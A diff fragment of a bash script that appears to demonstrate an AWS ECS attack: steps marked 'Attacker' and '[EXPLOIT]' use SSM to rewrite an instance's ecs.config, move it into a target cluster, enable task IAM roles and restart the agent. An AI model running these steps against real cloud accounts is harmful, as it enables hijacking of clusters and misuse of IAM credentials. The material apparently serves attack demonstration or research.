@@ -397,9 +397,9 @@ echo -e "${BLUE}instance with proper capability attributes (Docker version, OS t
 echo -e "${BLUE}needed for task placement.${NC}"
 echo ""
 
-RECONFIG_CMD="sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs && echo 'ECS agent reconfigured and restarted'"
+RECONFIG_CMD="sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && echo ECS_ENABLE_TASK_IAM_ROLE=true >> /etc/ecs/ecs.config && systemctl restart ecs && echo 'ECS agent reconfigured and restarted'"
 
-show_attack_cmd "Attacker" "sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs"
+show_attack_cmd "Attacker" "sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && echo ECS_ENABLE_TASK_IAM_ROLE=true >> /etc/ecs/ecs.config && systemctl restart ecs"
 
 ssm_exec "$RECONFIG_CMD"
 
@@ -476,6 +476,12 @@ if [ -z "$CONTAINER_INSTANCE_ARN" ]; then
 fi
 
 echo "Agent Container Instance ARN: $CONTAINER_INSTANCE_ARN"
+
+# Wait for ECS agent attributes (Docker capabilities etc.) to fully propagate
+# before calling StartTask — container instances freshly connected may not yet
+# have all attribute expressions required for task placement.
+echo "Waiting 30 seconds for container instance attributes to propagate (ECS_ENABLE_TASK_IAM_ROLE needs time to register)..."
+sleep 30
 
 # [EXPLOIT] Deregister the orphaned direct-API registration if it's different from the agent's
 use_admin_creds
